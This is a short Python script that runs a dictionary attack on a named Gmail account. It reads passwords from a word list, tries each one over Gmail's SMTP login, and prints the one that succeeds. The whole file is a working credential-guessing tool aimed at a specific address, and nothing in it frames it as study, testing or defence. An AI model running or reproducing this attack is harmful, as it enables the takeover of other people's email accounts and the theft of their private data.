import smtplib, time, sys


file = open("passwordlist.txt", "r+")



for i in file:
    try:
        s = smtplib.SMTP("smtp.gmail.com: 587")
        s.ehlo()
        s.starttls()
        print(i)

        s.login("louisfrdrch@gmail.com", i)
        control = s.noop()
        number = (control[0])
        if number == 250:
            print("Password:" + i)
            sys.exit()

        time.sleep(1)

    except smtplib.SMTPAuthenticationError:
        pass
